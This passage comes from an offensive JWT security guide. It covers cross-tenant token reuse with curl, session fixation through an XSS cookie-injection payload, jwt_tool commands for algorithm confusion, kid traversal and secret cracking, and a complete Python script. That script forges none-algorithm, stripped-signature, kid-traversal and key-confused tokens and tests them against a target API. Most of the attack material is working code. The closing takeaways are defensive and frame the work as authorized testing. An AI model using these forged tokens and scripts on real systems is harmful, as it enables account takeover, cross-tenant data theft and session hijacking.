   - If weak/no verification: Direct access
   - If weak secret: Brute force and forge

5. **Access Tenant B's data**
```bash
curl -H "Authorization: Bearer $modified_token" \
     https://api.saas.com/tenant-b/documents
```

---

### Scenario 6: Session Fixation via JWT

**Target:** Application with client-side JWT storage

**Attack Flow:**

1. **Attacker generates JWT with known secret**
```python
token = jwt.encode({
    "session_id": "attacker-controlled-123",
    "user_id": None,
    "exp": 9999999999
}, "weak-secret", algorithm="HS256")
```

2. **Inject token into victim's browser**
```javascript
// XSS payload
document.cookie = `token=${attacker_token}; path=/`;
```

3. **Victim logs in with attacker's token**
4. **Application updates token with victim's identity**
5. **Attacker reuses session_id to hijack session**

---

## Tools and Automation

### JWT Testing Toolkit

**jwt_tool - Comprehensive JWT Swiss Army Knife**
```bash
# Installation
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip3 install -r requirements.txt

# Decode token
python3 jwt_tool.py <JWT>

# Test all attacks
python3 jwt_tool.py <JWT> -M at -t "https://target.com/api"

# Specific attacks
python3 jwt_tool.py <JWT> -X a  # Algorithm confusion
python3 jwt_tool.py <JWT> -X i  # JWK injection
python3 jwt_tool.py <JWT> -X k  # Kid path traversal

# Crack secret
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# Forge token with known secret
python3 jwt_tool.py <JWT> -T -S hs256 -p "secret"
```

**Burp Suite Extensions**
- JWT Editor: Full JWT manipulation
- JSON Web Token Attacker: Automated attacks
- JWTMap: Token analysis and testing

**Custom Scripts**

**Complete JWT Auditor:**
```python
#!/usr/bin/env python3
import jwt
import requests
import base64
import json
from typing import Dict, List

class JWTAuditor:
    def __init__(self, token: str, target_url: str):
        self.token = token
        self.target_url = target_url
        self.header = jwt.get_unverified_header(token)
        self.payload = jwt.decode(token, options={"verify_signature": False})

    def test_none_algorithm(self) -> bool:
        """Test if none algorithm is accepted"""
        print("[*] Testing none algorithm...")

        header = {"alg": "none", "typ": "JWT"}
        payload = self.payload.copy()

        token_parts = [
            base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('='),
            base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('='),
            ""
        ]

        none_token = ".".join(token_parts)
        return self._test_token(none_token)

    def test_signature_stripping(self) -> bool:
        """Test if signature verification is enforced"""
        print("[*] Testing signature stripping...")

        token_parts = self.token.split('.')
        stripped_token = f"{token_parts[0]}.{token_parts[1]}."

        return self._test_token(stripped_token)

    def test_weak_secrets(self, wordlist: List[str]) -> str:
        """Brute force weak secrets"""
        print("[*] Testing weak secrets...")

        for secret in wordlist:
            try:
                jwt.decode(self.token, secret, algorithms=['HS256', 'HS384', 'HS512'])
                print(f"[+] Found secret: {secret}")
                return secret
            except:
                continue

        print("[-] No weak secret found")
        return None

    def test_kid_traversal(self) -> bool:
        """Test kid parameter for path traversal"""
        print("[*] Testing kid path traversal...")

        traversal_payloads = [
            "../../../../../../../dev/null",
            "../../../../../../../etc/passwd",
            "../../../../../../../proc/version"
        ]

        for payload in traversal_payloads:
            header = self.header.copy()
            header['kid'] = payload

            # Sign with null byte (for /dev/null)
            token = jwt.encode(
                self.payload,
                b'\x00',
                algorithm=self.header['alg'],
                headers=header
            )

            if self._test_token(token):
                print(f"[+] Vulnerable to kid traversal: {payload}")
                return True

        return False

    def test_algorithm_confusion(self, public_key: str) -> bool:
        """Test algorithm confusion attack"""
        print("[*] Testing algorithm confusion...")

        if self.header['alg'].startswith('RS'):
            header = self.header.copy()
            header['alg'] = 'HS256'

            token = jwt.encode(
                self.payload,
                public_key,
                algorithm='HS256',
                headers=header
            )

            return self._test_token(token)

        return False

    def _test_token(self, token: str) -> bool:
        """Test if token is accepted by the application"""
        try:
            response = requests.get(
                self.target_url,
                headers={'Authorization': f'Bearer {token}'},
                timeout=5
            )
            return response.status_code == 200
        except:
            return False

    def run_all_tests(self):
        """Run comprehensive audit"""
        print("="*50)
        print("JWT Security Audit")
        print("="*50)

        results = {
            "none_algorithm": self.test_none_algorithm(),
            "signature_stripping": self.test_signature_stripping(),
            "kid_traversal": self.test_kid_traversal()
        }

        print("\n" + "="*50)
        print("Audit Results:")
        for test, result in results.items():
            status = "[VULNERABLE]" if result else "[SECURE]"
            print(f"{test}: {status}")

# Usage
if __name__ == "__main__":
    token = "eyJ..."
    target = "https://api.example.com/protected"

    auditor = JWTAuditor(token, target)
    auditor.run_all_tests()
```

---

## Summary

JWT attacks exploit various weaknesses in implementation, configuration, and cryptographic handling. Key takeaways:

1. **Always verify signatures** - Never decode without verification
2. **Reject "none" algorithm** - Enforce strict algorithm whitelist
3. **Use strong secrets** - Minimum 256 bits, cryptographically random
4. **Validate header parameters** - Never trust kid, jku, jwk, x5u
5. **Enforce algorithm matching** - Prevent RS256→HS256 confusion
6. **Implement proper key management** - Secure storage, rotation
7. **Add defense in depth** - exp, aud, iss validation
8. **Regular security testing** - Automated and manual audits

This comprehensive guide provides the foundation for understanding and exploiting JWT vulnerabilities in authorized security assessments.
